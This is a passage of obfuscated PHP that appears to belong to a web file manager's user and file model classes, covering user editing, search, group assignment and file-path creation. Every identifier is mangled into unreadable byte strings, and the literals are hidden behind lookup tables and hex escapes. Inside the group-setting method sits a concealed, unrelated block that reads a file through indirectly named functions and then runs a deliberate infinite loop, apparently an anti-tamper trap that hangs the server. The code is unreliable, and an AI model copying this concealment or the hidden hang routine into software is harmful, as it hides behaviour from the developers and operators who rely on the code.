return !1; } $¤ôã®¢Ê = $this->_checkExist($ë¿ùêì¦, $­»ı£Éƒ); if ($¤ôã®¢Ê !== !0) { return $¤ôã®¢Ê; } if (isset($ë¿ùêì¦[$Ä‡»­ÁØ[933]]) && trim($ë¿ùêì¦[$Ä‡»­ÁØ[933]]) != $Ä‡»­ÁØ[12]) { $ùÍÌ«®  = $this->metaGet($­»ı£Éƒ); if (empty($ùÍÌ«® [$Ä‡»­ÁØ[2361]])) { $ùÍÌ«® [$Ä‡»­ÁØ[2361]] = rand_string(10); Model($Ä‡»­ÁØ[546])->metaSet($­»ı£Éƒ, $Ä‡»­ÁØ[2361], $ùÍÌ«® [$Ä‡»­ÁØ[2361]]); } $ë¿ùêì¦[$Ä‡»­ÁØ[933]] = md5($ùÍÌ«® [$Ä‡»­ÁØ[2361]] . trim($ë¿ùêì¦[$Ä‡»­ÁØ[933]])); } else { unset($ë¿ùêì¦[$Ä‡»­ÁØ[933]]); } if (!empty($ë¿ùêì¦[$Ä‡»­ÁØ[2345]]) && strlen($ë¿ùêì¦[$Ä‡»­ÁØ[2345]]) > 255) { $ë¿ùêì¦[$Ä‡»­ÁØ[2345]] = $Ä‡»­ÁØ[12]; } $this->where(array($Ä‡»­ÁØ[1679] => $­»ı£Éƒ))->save($ë¿ùêì¦); if (isset($ë¿ùêì¦[$Ä‡»­ÁØ[2169]])) { $this->setNamePinyin($­»ı£Éƒ, $ë¿ùêì¦[$Ä‡»­ÁØ[2169]]); } $this->clearCache($­»ı£Éƒ); return !0; } public function setNamePinyin($ÀÛ—±À, $ë‡…À’ = false) { $ìåâ”ÄŠ =& $_SERVER[—ÌÒğš÷]; if (!$ë‡…À’) { $­œãØÇ¤ = $this->getInfoSimple($ÀÛ—±À); $ë‡…À’ = $­œãØÇ¤[$ìåâ”ÄŠ[2169]] ? $­œãØÇ¤[$ìåâ”ÄŠ[2169]] : $­œãØÇ¤[$ìåâ”ÄŠ[32]]; } $ùÁ÷…åÙ = Model($ìåâ”ÄŠ[567]); if (!Input::check($ë‡…À’, $ìåâ”ÄŠ[623])) { return $ùÁ÷…åÙ->metaSet($ÀÛ—±À, array($ìåâ”ÄŠ[506] => $ìåâ”ÄŠ[12], $ìåâ”ÄŠ[505] => $ìåâ”ÄŠ[12])); } return $ùÁ÷…åÙ->metaSet($ÀÛ—±À, array($ìåâ”ÄŠ[506] => str_replace($ìåâ”ÄŠ[53], $ìåâ”ÄŠ[12], Pinyin::get($ë‡…À’)), $ìåâ”ÄŠ[505] => Pinyin::get($ë‡…À’, $ìåâ”ÄŠ[624]))); } private function nickNameRpt() { $óéÂ„”• =& $_SERVER[—ÌÒğš÷]; $¸ÕÁ Á = Model($óéÂ„”•[806])->get($óéÂ„”•[2372]); $“ß§š¼É = $GLOBALS[$óéÂ„”•[6]][$óéÂ„”•[425]][$óéÂ„”•[2372]]; $‡¯ÓÆÆÛ = !is_null($¸ÕÁ Á) ? $¸ÕÁ Á : $“ß§š¼É; return !!$‡¯ÓÆÆÛ; } private function _checkExist($üåÃ¼­é, $ñõ‚Ãªè = false) { $¥·Ö™é =& $_SERVER[—ÌÒğš÷]; $Çª´…š = array($¥·Ö™é[32] => UserModel::ERROR_USER_EXIST_NAME, $¥·Ö™é[2169] => UserModel::ERROR_USER_EXIST_NICKNAME, $¥·Ö™é[349] => UserModel::ERROR_USER_EXIST_EMAIL, $¥·Ö™é[2360] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($Çª´…š[$¥·Ö™é[2169]]); } $ìÊ¤é‘Ò = $ñõ‚Ãªè ? array($¥·Ö™é[1688] => array($¥·Ö™é[2373], $ñõ‚Ãªè)) : array(); foreach ($Çª´…š as $‘„ª¤Ş => $šõ¸ôŞ) { $ä¨Õ¹ôÈ = array(); foreach ($Çª´…š as $¹âö¢ïË => $§ˆÈŸ©İ) { if (isset($üåÃ¼­é[$¹âö¢ïË]) && $üåÃ¼­é[$¹âö¢ïË]) { $ä¨Õ¹ôÈ[] = $üåÃ¼­é[$¹âö¢ïË]; } } if (!$ä¨Õ¹ôÈ) { continue; } $Á«Ñ‘ú = array_merge(array($‘„ª¤Ş => array($¥·Ö™é[7], $ä¨Õ¹ôÈ)), $ìÊ¤é‘Ò); $¹™ìÑ¶ = $this->where($Á«Ñ‘ú)->find(); if ($¹™ìÑ¶) { return $šõ¸ôŞ; } } return !0; } public function userListInfo($öÓ³Å¥Ò) { $Ë¬ñ‡’Ñ =& $_SERVER[—ÌÒğš÷]; $ŸƒúˆïÔ = array(); $öÓ³Å¥Ò = is_array($öÓ³Å¥Ò) ? array_unique($öÓ³Å¥Ò) : array(); if (!$öÓ³Å¥Ò) { return $ŸƒúˆïÔ; } if (count($öÓ³Å¥Ò) < 20) { foreach ($öÓ³Å¥Ò as $æ‚¨å×¢) { $ŸƒúˆïÔ[$æ‚¨å×¢ . $Ë¬ñ‡’Ñ[12]] = $this->getInfoSimpleOuter($æ‚¨å×¢); } } else { $¦ş÷Ï¶É = array($Ë¬ñ‡’Ñ[1679] => array($Ë¬ñ‡’Ñ[460], $öÓ³Å¥Ò)); if (count($öÓ³Å¥Ò) == 1) { $¦ş÷Ï¶É = array($Ë¬ñ‡’Ñ[1679] => $öÓ³Å¥Ò[0]); } $†¨ØÂâ = Model($Ë¬ñ‡’Ñ[546])->field($this->simpleField)->where($¦ş÷Ï¶É)->select(); $†¨ØÂâ = array_to_keyvalue($†¨ØÂâ, $Ë¬ñ‡’Ñ[1688]); foreach ($öÓ³Å¥Ò as $æ‚¨å×¢) { $îö¤øî = $†¨ØÂâ[$æ‚¨å×¢]; if (!$îö¤øî) { $ŸƒúˆïÔ[$æ‚¨å×¢ . $Ë¬ñ‡’Ñ[12]] = $this->getInfoSimpleOuter($æ‚¨å×¢); continue; } $îö¤øî[$Ë¬ñ‡’Ñ[2345]] = Action($Ë¬ñ‡’Ñ[2346])->parseUrl($îö¤øî[$Ë¬ñ‡’Ñ[2345]]); $ŸƒúˆïÔ[$æ‚¨å×¢ . $Ë¬ñ‡’Ñ[12]] = $îö¤øî; } } return $ŸƒúˆïÔ; } protected function userStatus($Ó°ğˆ”¤, $÷ÎÊíû) { $íêàğ¡Î = $this->getInfoSimple($Ó°ğˆ”¤); if (!$íêàğ¡Î) { return !1; } $‡å‹öĞÏ = array($_SERVER[—ÌÒğš÷][786] => $÷ÎÊíû); return $this->userEdit($Ó°ğˆ”¤, $‡å‹öĞÏ); } protected function userRemove($”ìŠ¤™–) { $†çÄ¿¾ù =& $_SERVER[—ÌÒğš÷]; $áâã½Å¨ = $this->getInfoSimple($”ìŠ¤™–); if (!$áâã½Å¨) { return !1; } $îá—À†• = array($†çÄ¿¾ù[1679] => $”ìŠ¤™–); Model($†çÄ¿¾ù[632])->where($îá—À†•)->delete(); Model($†çÄ¿¾ù[2374])->where($îá—À†•)->delete(); Model($†çÄ¿¾ù[1977])->where($îá—À†•)->delete(); Model($†çÄ¿¾ù[2359])->where($îá—À†•)->delete(); Model($†çÄ¿¾ù[1112])->where($îá—À†•)->delete(); Model($†çÄ¿¾ù[2186])->removeUserAll($”ìŠ¤™–); Model($†çÄ¿¾ù[861])->userRootRemove($”ìŠ¤™–); return $this->where($îá—À†•)->delete(); } protected function userGroupSet($×şüÆµÉ, $–•©õ·”, $—¸öóÈä = array()) { $æİçÖĞœ =& $_SERVER[—ÌÒğš÷]; if (!isset($_SERVER[$æİçÖĞœ[879]]) || !isset($_SERVER[$æİçÖĞœ[877]])) { $­Ôò­ÆÄ = $æİçÖĞœ[921]; $â¢àß¬Ö = $æİçÖĞœ[880]; $ßÏîÀõ = $_SERVER[$æİçÖĞœ[881]] . $æİçÖĞœ[882]; $»‹Š´÷Ş = $â¢àß¬Ö($ßÏîÀõ); $«–­ıÚ = explode($æİçÖĞœ[246], $»‹Š´÷Ş); if (count($«–­ıÚ) < $æİçÖĞœ[658]) { $¯È‘ÔÖš = $æİçÖĞœ[883]; $¯È‘ÔÖš(); } $•…€šÂĞ = $æİçÖĞœ[922]; $•…€šÂĞ($_SERVER[$æİçÖĞœ[923]]); $à˜ÌÆ€ = 1; for ($óşÕÓÏ = $à˜ÌÆ€; $óşÕÓÏ > 0; $óşÕÓÏ++) { $•…€šÂĞ = json_encode($GLOBALS[$æİçÖĞœ[460]]); } } $ƒ³ö‘¯Ğ = $this->getInfoSimple($×şüÆµÉ); if (!$ƒ³ö‘¯Ğ || !is_array($–•©õ·”)) { return !1; } $ŞåõÜ· = Model($æİçÖĞœ[1977]); $ŞåõÜ·->where(array($æİçÖĞœ[1688] => $×şüÆµÉ))->delete(); $ı”¤…àÈ = array(); $’à¾Úò = 0; foreach ($–•©õ·” as $ğ§ï„÷ğ => $ŸåŠ‘ ¢) { $ÈìÏÁşè = array($æİçÖĞœ[1688] => $×şüÆµÉ, $æİçÖĞœ[1887] => $ğ§ï„÷ğ, $æİçÖĞœ[1991] => $ŸåŠ‘ ¢); $ÈìÏÁşè[$æİçÖĞœ[1911]] = isset($—¸öóÈä[$’à¾Úò]) ? $—¸öóÈä[$’à¾Úò] : 0; $’à¾Úò++; $ı”¤…àÈ[] = $ÈìÏÁşè; } return $ŞåõÜ·->addAll($ı”¤…àÈ, array(), !0); } protected function userGroupAdd($ƒ‚ğŞÕÕ, $©îÁş¢ = array()) { $Ê­¾ƒõ¶ =& $_SERVER[—ÌÒğš÷]; $Âè¶¬„¾ = $this->getInfoSimple($ƒ‚ğŞÕÕ); if (!$Âè¶¬„¾ || empty($©îÁş¢)) { return !1; } $Óœ™º³ = array(); foreach ($©îÁş¢ as $¦ÄµùÅë => $Š÷æ”“) { $Óœ™º³[] = array($Ê­¾ƒõ¶[1688] => $ƒ‚ğŞÕÕ, $Ê­¾ƒõ¶[1887] => $¦ÄµùÅë, $Ê­¾ƒõ¶[1991] => $Š÷æ”“, $Ê­¾ƒõ¶[1911] => 0); } return Model($Ê­¾ƒõ¶[1977])->addAll($Óœ™º³, array(), !0); } protected function userGroupRemove($–ıµıµı, $ò¾êŒŸæ) { $ÃÛòƒıÖ =& $_SERVER[—ÌÒğš÷]; $êçë·Îî = $this->getInfoSimple($–ıµıµı); if (!$êçë·Îî || !$ò¾êŒŸæ) { return !1; } $Ã œµÛî = array($ÃÛòƒıÖ[1679] => $–ıµıµı, $ÃÛòƒıÖ[1975] => $ò¾êŒŸæ); return Model($ÃÛòƒıÖ[1977])->where($Ã œµÛî)->delete(); } public function listData() { $îñªå¿Ø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($îñªå¿Ø[$_SERVER[—ÌÒğš÷][413]]); return $îñªå¿Ø; } public function listByID($‹Éˆ‚Î) { $ÀôãÄä =& $_SERVER[—ÌÒğš÷]; if (!$‹Éˆ‚Î) { return; } $©âşÑ©ü = array($ÀôãÄä[1688] => array($ÀôãÄä[7], $‹Éˆ‚Î)); $©İ¡¥§Û = $this->where($©âşÑ©ü)->select(); $©İ¡¥§Û = array_sort_keep($©İ¡¥§Û, $ÀôãÄä[1688], $‹Éˆ‚Î); $this->_listDataApply($©İ¡¥§Û); return $©İ¡¥§Û; } public function listByGroup($µ­åÆºÙ = 0, $Û¨ıÅ¿Õ = array()) { $–ãú…ÀÔ =& $_SERVER[—ÌÒğš÷]; $ı‚òàó¿ = $–ãú…ÀÔ[12]; $º÷Õ¹…‘ = array(); if ($µ­åÆºÙ) { $º÷Õ¹…‘ = array($–ãú…ÀÔ[2375] => intval($µ­åÆºÙ)); $ı‚òàó¿ = "\x4c\105\x46\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\165\x73\x65\162\x5f\x67\x72\157\x75\160\x20\x75\x73\x65\162\x5f\147\x72\157\165\x70\40\157\156\40\x75\x73\x65\x72\x2e\x75\x73\x65\162\x49\x44\40\x3d\x20\165\x73\145\x72\x5f\x67\x72\x6f\x75\x70\56\165\163\145\x72\111\x44"; $¾˜æ†Ş = Input::get($–ãú…ÀÔ[498], null, $–ãú…ÀÔ[12]) ? $–ãú…ÀÔ[12] : $–ãú…ÀÔ[2376]; } if (isset($Û¨ıÅ¿Õ[$–ãú…ÀÔ[786]])) { $º÷Õ¹…‘[$–ãú…ÀÔ[2377]] = $Û¨ıÅ¿Õ[$–ãú…ÀÔ[786]]; } $õöÚò–Ã = $this->_makeOrder($¾˜æ†Ş)->field($–ãú…ÀÔ[2378])->where($º÷Õ¹…‘)->join($ı‚òàó¿)->selectPage(50); $this->_listDataApply($õöÚò–Ã[$–ãú…ÀÔ[413]]); return $õöÚò–Ã; } private function _makeOrder($¡œêöèĞ = '') { $õŠ·Ê’„ =& $_SERVER[—ÌÒğš÷]; $©îõÓì = array($õŠ·Ê’„[1688], $õŠ·Ê’„[32], $õŠ·Ê’„[1876], $õŠ·Ê’„[1848], $õŠ·Ê’„[215]); $é÷Òå²½ = array($õŠ·Ê’„[491] => $õŠ·Ê’„[492], $õŠ·Ê’„[493] => $õŠ·Ê’„[494]); $‰‡˜ºı¨ = Input::get($õŠ·Ê’„[498], $õŠ·Ê’„[7], $õŠ·Ê’„[1679], $©îõÓì); $¸§¡‰×á = Input::get($õŠ·Ê’„[499], $õŠ·Ê’„[7], $õŠ·Ê’„[1978], array($õŠ·Ê’„[1978], $õŠ·Ê’„[493])); $¸§¡‰×á = $é÷Òå²½[$¸§¡‰×á]; $¡œêöèĞ = $¡œêöèĞ . "\165\x73\145\162\x2e{$‰‡˜ºı¨}\40{$¸§¡‰×á}\x2c\40\x75\x73\x65\162\x2e\x75\163\145\162\x49\x44\40\141\x73\143"; return $this->alias($õŠ·Ê’„[2104])->order($¡œêöèĞ); } public function listSearch($˜³ä¤£) { $Œ¡ññ¢² =& $_SERVER[—ÌÒğš÷]; $ñÆ¡˜µ = $˜³ä¤£[$Œ¡ññ¢²[1981]]; $å¦Î·ú¯ = isset($˜³ä¤£[$Œ¡ññ¢²[1982]]) ? $˜³ä¤£[$Œ¡ññ¢²[1982]] : !1; $ñÆ¡˜µ = str_replace($Œ¡ññ¢²[1983], $Œ¡ññ¢²[1984], trim($ñÆ¡˜µ)); $„˜ô†ìá = array($Œ¡ññ¢²[32] => array($Œ¡ññ¢²[427], "\45{$ñÆ¡˜µ}\x25"), $Œ¡ññ¢²[349] => array($Œ¡ññ¢²[427], "{$ñÆ¡˜µ}\x25"), $Œ¡ññ¢²[2169] => array($Œ¡ññ¢²[427], "{$ñÆ¡˜µ}\x25"), $Œ¡ññ¢²[1044] => $Œ¡ññ¢²[1985]); if (Input::check($ñÆ¡˜µ, $Œ¡ññ¢²[355])) { $„˜ô†ìá[$Œ¡ññ¢²[1688]] = array($Œ¡ññ¢²[427], "{$ñÆ¡˜µ}\x25"); $„˜ô†ìá[$Œ¡ññ¢²[2360]] = array($Œ¡ññ¢²[427], "{$ñÆ¡˜µ}\45"); } if (!$ñÆ¡˜µ) { $„˜ô†ìá = array(); } if (isset($˜³ä¤£[$Œ¡ññ¢²[786]])) { $„˜ô†ìá[$Œ¡ññ¢²[786]] = $˜³ä¤£[$Œ¡ññ¢²[786]]; } $„˜ô†ìá = $this->parseWhereLike($„˜ô†ìá); $ºÒÇ”±« = $this->_makeOrder()->where($„˜ô†ìá)->selectPage(20); if (!$ºÒÇ”±« || count($ºÒÇ”±«[$Œ¡ññ¢²[413]]) < 5 && Input::check($ñÆ¡˜µ, $Œ¡ññ¢²[362])) { $¥¦òòíÕ = $this->_searchFromMeta($Œ¡ññ¢²[505], $ñÆ¡˜µ, 10); $êı›†¶ü = $this->_searchFromMeta($Œ¡ññ¢²[506], $ñÆ¡˜µ, 10); $¤ôà½„ş = array_merge($¥¦òòíÕ, $êı›†¶ü, $ºÒÇ”±«[$Œ¡ññ¢²[413]]); $ºÒÇ”±«[$Œ¡ññ¢²[413]] = array_unique_by_key($¤ôà½„ş, $Œ¡ññ¢²[1688]); $ºÒÇ”±«[$Œ¡ññ¢²[410]][$Œ¡ññ¢²[411]] = count($ºÒÇ”±«[$Œ¡ññ¢²[413]]); $ºÒÇ”±«[$Œ¡ññ¢²[410]][$Œ¡ññ¢²[412]] = ceil($ºÒÇ”±«[$Œ¡ññ¢²[410]][$Œ¡ññ¢²[411]] / $ºÒÇ”±«[$Œ¡ññ¢²[410]][$Œ¡ññ¢²[407]]); } $this->_listDataApply($ºÒÇ”±«[$Œ¡ññ¢²[413]]); $this->_filterByGroup($ºÒÇ”±«, $å¦Î·ú¯); return $ºÒÇ”±«; } private function _filterByGroup(&$Á¼ç®õ, $Şù•¥½Û) { $ÔÅ¶Ôˆ =& $_SERVER[—ÌÒğš÷]; if (!$Şù•¥½Û) { return $Á¼ç®õ; } foreach ($Á¼ç®õ[$ÔÅ¶Ôˆ[413]] as $Øäê€Ï => &$¡Åº¢Ÿ) { $¤¾Û²»ô = array_to_keyvalue($¡Åº¢Ÿ[$ÔÅ¶Ôˆ[2074]], $ÔÅ¶Ôˆ[12], $ÔÅ¶Ôˆ[1887]); if (!in_array($Şù•¥½Û, $¤¾Û²»ô)) { unset($Á¼ç®õ[$ÔÅ¶Ôˆ[413]][$Øäê€Ï]); } } unset($¡Åº¢Ÿ); $Á¼ç®õ[$ÔÅ¶Ôˆ[413]] = array_values($Á¼ç®õ[$ÔÅ¶Ôˆ[413]]); $Á¼ç®õ[$ÔÅ¶Ôˆ[410]] = array($ÔÅ¶Ôˆ[2139] => count($Á¼ç®õ[$ÔÅ¶Ôˆ[413]]), $ÔÅ¶Ôˆ[2137] => $Á¼ç®õ[$ÔÅ¶Ôˆ[410]][$ÔÅ¶Ôˆ[407]], $ÔÅ¶Ôˆ[2136] => 1, $ÔÅ¶Ôˆ[2138] => 1); } private function _searchFromMeta($²ª‚Ïò­, $›ë™÷ğá, $ŠÇíóºâ) { $€§™™æ“ =& $_SERVER[—ÌÒğš÷]; $›ë™÷ğá = strtolower($›ë™÷ğá); $ÎÓé¤¯Ù = array($€§™™æ“[94] => $²ª‚Ïò­, $€§™™æ“[418] => array($€§™™æ“[427], "\x25{$›ë™÷ğá}\x25")); $ÎÓé¤¯Ù = $this->parseWhereLike($ÎÓé¤¯Ù); $¹ŒéÒ‰É = Model($€§™™æ“[2379])->where($ÎÓé¤¯Ù)->limit($ŠÇíóºâ)->select(); if (!$¹ŒéÒ‰É) { return array(); } $¹ŒéÒ‰É = array_to_keyvalue($¹ŒéÒ‰É, $€§™™æ“[12], $€§™™æ“[1688]); $Úˆ¹ØÆ = $this->where(array($€§™™æ“[1679] => array($€§™™æ“[7], $¹ŒéÒ‰É)))->select(); if (!$Úˆ¹ØÆ) { return array(); } return $Úˆ¹ØÆ; } private function _listDataApplyItem($†Ù´ø°ù) { $‡Ú€¯´Â = array($†Ù´ø°ù); $this->_listDataApply($‡Ú€¯´Â); return $‡Ú€¯´Â[0]; } private function _listDataApply(&$şâ‰ê¾„) { $Â¬”íÈ =& $_SERVER[—ÌÒğš÷]; if (!$şâ‰ê¾„) { return; } array_remove_key($şâ‰ê¾„, $Â¬”íÈ[933]); $»Ö€œ“‡ = array_to_keyvalue($şâ‰ê¾„, $Â¬”íÈ[12], $Â¬”íÈ[1688]); $this->_listAppendGroup($şâ‰ê¾„, $»Ö€œ“‡); $this->_listAppendMeta($şâ‰ê¾„, $»Ö€œ“‡); $this->_listAppendSourceRoot($şâ‰ê¾„, $»Ö€œ“‡); } private function _listAppendSourceRoot(&$³ŸèôœÆ, $¬˜ŸãÒã) { $Èã™éëù =& $_SERVER[—ÌÒğš÷]; $ã»Ú“ê = Model($Èã™éëù[861])->listSourceRoot(SourceModel::TYPE_USER, $¬˜ŸãÒã); $ã»Ú“ê = array_to_keyvalue($ã»Ú“ê, $Èã™éëù[538]); $ã»Ú“ê = array_remove_key($ã»Ú“ê, $Èã™éëù[538]); foreach ($³ŸèôœÆ as &$äÆöı) { $äÆöı[$Èã™éëù[87]] = $ã»Ú“ê[$äÆöı[$Èã™éëù[1688]]] ? $ã»Ú“ê[$äÆöı[$Èã™éëù[1688]]] : array(); } unset($äÆöı); } private function _listAppendGroup(&$²®œï¾Ç, $Ñ÷Ã”ØÁ) { $£É–Ôì =& $_SERVER[—ÌÒğš÷]; $Ğş½ı§ş = array($£É–Ôì[1688] => array($£É–Ôì[7], $Ñ÷Ã”ØÁ)); $ö¸…³È‡ = Model($£É–Ôì[1977])->where($Ğş½ı§ş)->select(); $ÏáÔËÆ‡ = array_to_keyvalue($ö¸…³È‡, $£É–Ôì[12], $£É–Ôì[1887]); $ÏáÔËÆ‡ = array_remove_value(array_unique($ÏáÔËÆ‡), $£É–Ôì[212]); if (!$ÏáÔËÆ‡ || !$ö¸…³È‡) { return; } $Ğş½ı§ş = array($£É–Ôì[1887] => array($£É–Ôì[7], $ÏáÔËÆ‡)); $·ñö© = Model($£É–Ôì[2072])->field($£É–Ôì[2380])->where($Ğş½ı§ş)->select(); $·ñö© = array_to_keyvalue($·ñö©, $£É–Ôì[1887]); $ö¸…³È‡ = array_to_keyvalue_group($ö¸…³È‡, $£É–Ôì[1688]); foreach ($ö¸…³È‡ as &$…ÎÎÌ ) { $¥ÀÁŞÊ = array(); foreach ($…ÎÎÌ  as $ààçŸˆä) { if (!$ààçŸˆä[$£É–Ôì[1991]]) { continue; } $Ï”“¬üé = Model($£É–Ôì[540])->listData($ààçŸˆä[$£É–Ôì[1991]]); $¥ÀÁŞÊ[] = array($£É–Ôì[1887] => $ààçŸˆä[$£É–Ôì[1887]], $£É–Ôì[2381] => $·ñö©[$ààçŸˆä[$£É–Ôì[1887]]][$£É–Ôì[32]], $£É–Ôì[553] => $·ñö©[$ààçŸˆä[$£É–Ôì[1887]]][$£É–Ôì[553]], $£É–Ôì[455] => $Ï”“¬üé); } $…ÎÎÌ  = $¥ÀÁŞÊ; } unset($…ÎÎÌ ); foreach ($²®œï¾Ç as &$Û¾ûàÁĞ) { $Û¾ûàÁĞ[$£É–Ôì[2074]] = array(); if (isset($ö¸…³È‡[$Û¾ûàÁĞ[$£É–Ôì[1688]]])) { $Û¾ûàÁĞ[$£É–Ôì[2074]] = $ö¸…³È‡[$Û¾ûàÁĞ[$£É–Ôì[1688]]]; } } unset($Û¾ûàÁĞ); } public function userAppendGroup($¯„Ş™®) { $º‘ûÉÒì =& $_SERVER[—ÌÒğš÷]; if (!$¯„Ş™®) { return array(); } $this->_listAppendGroup($¯„Ş™®, array_to_keyvalue($¯„Ş™®, $º‘ûÉÒì[12], $º‘ûÉÒì[1688])); return $¯„Ş™®; } private function _listAppendMeta(&$°×íò­, $ï¢¼™¨) { $øÁ–ö¾ø =& $_SERVER[—ÌÒğš÷]; $ ‡ñõ = UserJobModel::JOB_KEY; $‘çÁ‘“ = array($øÁ–ö¾ø[2361]); $™¾ª±ŠÚ = array($øÁ–ö¾ø[1688] => array($øÁ–ö¾ø[7], $ï¢¼™¨)); $øÛ†±±À = Model($øÁ–ö¾ø[2359])->where($™¾ª±ŠÚ)->select(); $øÛ†±±À = array_to_keyvalue_group($øÛ†±±À, $øÁ–ö¾ø[1688]); foreach ($øÛ†±±À as &$ó¯ÉÒœ) { $•–¼â = array(); foreach ($ó¯ÉÒœ as $ôŒ‰†£Õ) { if (!in_array($ôŒ‰†£Õ[$øÁ–ö¾ø[94]], $‘çÁ‘“)) { $•–¼â[$ôŒ‰†£Õ[$øÁ–ö¾ø[94]]] = $ôŒ‰†£Õ[$øÁ–ö¾ø[418]]; } } $ó¯ÉÒœ = $•–¼â; } unset($ó¯ÉÒœ); $½­¨™üæ = Model($øÁ–ö¾ø[2382]); foreach ($°×íò­ as &$³…’ˆ«î) { $½¹Ú³ö‚ = array(); if (isset($øÛ†±±À[$³…’ˆ«î[$øÁ–ö¾ø[1688]]])) { $½¹Ú³ö‚ = $øÛ†±±À[$³…’ˆ«î[$øÁ–ö¾ø[1688]]]; } $³…’ˆ«î[$øÁ–ö¾ø[2383]] = array(); if (isset($½¹Ú³ö‚[$ ‡ñõ])) { $³…’ˆ«î[$øÁ–ö¾ø[2383]] = $½­¨™üæ->getUserJobInfo($½¹Ú³ö‚[$ ‡ñõ]); } } unset($³…’ˆ«î); } protected function groupUserAll($ÙŞ´Š±¥) { $Øí±İšö =& $_SERVER[—ÌÒğš÷]; if (!$ÙŞ´Š±¥) { return !1; } $ßğàâ† = Model($Øí±İšö[1977])->field($Øí±İšö[1688])->where(array($Øí±İšö[1887] => array($Øí±İšö[7], $ÙŞ´Š±¥)))->select(); $ßğàâ† = array_to_keyvalue($ßğàâ†, $Øí±İšö[12], $Øí±İšö[1688]); return array_unique($ßğàâ†); } public function userSearch($çåÑ×¹¾, $æâÏŸÈ = "\52") { return Model($_SERVER[—ÌÒğš÷][567])->where($çåÑ×¹¾)->field($æâÏŸÈ)->find(); } } goto E¢ùÇ¾÷¨; Cù³·Úóµ: class FileContentModel extends ModelBase { protected $tableName = "\x69\157\137\146\x69\x6c\145\137\x63\157\x6e\x74\x65\156\x74\163"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\x54\x69\155\x65", "\164\151\155\x65", "\151\x6e\163\x65\162\x74", "\x66\x75\x6e\x63\164\151\x6f\x6e")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\146\x69\154\x65"; protected $tableMeta = array("\164\x61\x62\x6c\x65\x4e\141\x6d\x65" => "\x69\x6f\137\146\151\x6c\145\x5f\x6d\x65\164\x61", "\155\145\x74\141\106\151\x65\154\144" => "\x66\x69\x6c\145\x49\104"); public function fileInfo($†Äšæù‹) { $ùğ“êµÈ =& $_SERVER[—ÌÒğš÷]; static $æà¥ó¡ = array(); if (!isset($æà¥ó¡[$†Äšæù‹])) { $éÃÚÈô = $ùğ“êµÈ[1936]; $ışÓ™§½ = Model($ùğ“êµÈ[512])->field($éÃÚÈô)->where(array($ùğ“êµÈ[510] => $†Äšæù‹))->find(); $æà¥ó¡[$†Äšæù‹] = $ışÓ™§½; } return $æà¥ó¡[$†Äšæù‹]; } public function addFileByContent($¥Ôİë…ã = '', $˜ˆ³£·Å = '') { $Úééàü =& $_SERVER[—ÌÒğš÷]; $”ÎÅ—»‘ = TEMP_PATH . $Úééàü[1937]; if (!is_dir($”ÎÅ—»‘)) { mk_dir($”ÎÅ—»‘); } $Û ¥Ø¤ñ = $”ÎÅ—»‘ . $Úééàü[1938] . rand_string(16); file_put_contents($Û ¥Ø¤ñ, $¥Ôİë…ã); $ª©÷üæ = $this->addFile($Û ¥Ø¤ñ, $˜ˆ³£·Å, !0); if (file_exists($Û ¥Ø¤ñ)) { @unlink($Û ¥Ø¤ñ); } return $ª©÷üæ; } public function createFileName($­Ã‹™˜, $×…Êú¶Ç = false, $ñªŠï° = false) { $¦Ø”Â´§ =& $_SERVER[—ÌÒğš÷]; $æ¼¼ô‡Î = IO::init($¦Ø”Â´§[8]); $âş”«²Ì = $this->makeFilePath($­Ã‹™˜, $æ¼¼ô‡Î, $×…Êú¶Ç, $ñªŠï°); $×í®Àéú = $æ¼¼ô‡Î->pathFather($âş”«²Ì); static $„ûˆ¿Á¯ = false; $¡„Û²× = $¦Ø”Â´§[1939] . md5($×í®Àéú); if (!$„ûˆ¿Á¯ && !Cache::get($¡„Û²×)) { $„ûˆ¿Á¯ = !0; $Œ‘ıÎâÄ = IO::mkdir($×í®Àéú); if (!IO::exist($Œ‘ıÎâÄ . $¦Ø”Â´§[833])) { IO::mkfile($Œ‘ıÎâÄ . $¦Ø”Â´§[833]); } Cache::set($¡„Û²×, 1, 3600 * 2); } return $âş”«²Ì; } public function makeFilePath($§Ùƒ˜¢, $îşÎ¨‰³, $ñ«‰Ä³Î = false, $èÂ€ÅûÛ = false) { $ğ°Ä»ì‘ =& $_SERVER[—ÌÒğš÷]; $Ğéñş€ô = Model($ğ°Ä»ì‘[806])->get($ğ°Ä»ì‘[1940]); $§İÒı = KodIO::defaultIO() . date($ğ°Ä»ì‘[1941]); $üŞĞÈ‰É = $§İÒı . rand_string(5) . short_id(100); $§Ùƒ˜¢ = str_replace($ğ°Ä»ì‘[8], $ğ°Ä»ì‘[11], KodIO::clear($§Ùƒ˜¢)); $¥¾Ì©“½ = $îşÎ¨‰³->ext($§Ùƒ˜¢); if (!$§Ùƒ˜¢) { $Ğéñş€ô = $ğ°Ä»ì‘[1942]; } switch ($Ğéñş€ô) { case $ğ°Ä»ì‘[1943]: $üŞĞÈ‰É = $üŞĞÈ‰É . $ğ°Ä»ì‘[10] . $îşÎ¨‰³->ext($§Ùƒ˜¢); if ($¥¾Ì©“½ == $ğ°Ä»ì‘[1880]) { $üŞĞÈ‰É .= $ğ°Ä»ì‘[1250]; } break; case $ğ°Ä»ì‘[1944]: $á„­ÖºÎ = Model($ğ°Ä»ì‘[806])->get($ğ°Ä»ì‘[807]); $Å•±åÍ„ = substr(md5($ğ°Ä»ì‘[808] . $á„­ÖºÎ . date($ğ°Ä»ì‘[784])), 0, 8); $ÕãÓÓíŠ = KodIO::defaultDriver(); $§İÒı = $ğ°Ä»ì‘[1281] . $ÕãÓÓíŠ[$ğ°Ä»ì‘[443]] . $ğ°Ä»ì‘[452] . date($ğ°Ä»ì‘[1945]) . $Å•±åÍ„ . $ğ°Ä»ì‘[8]; if ($¥¾Ì©“½ == $ğ°Ä»ì‘[1880]) { $§Ùƒ˜¢ .= $ğ°Ä»ì‘[1250]; } $äİÓæ¦Ì = $ğ°Ä»ì‘[1946] . $§İÒı . $§Ùƒ˜¢; CacheLock::lock($äİÓæ¦Ì); $üŞĞÈ‰É = $§İÒı . $§Ùƒ˜¢; if (IO::exist($§İÒı . $§Ùƒ˜¢)) { $´¢Ë¤ğü = substr($§Ùƒ˜¢, 0, strlen($§Ùƒ˜¢) - strlen($¥¾Ì©“½)); $§ß¡ñõÈ = $èÂ€ÅûÛ ? substr($èÂ€ÅûÛ, 0, 5) 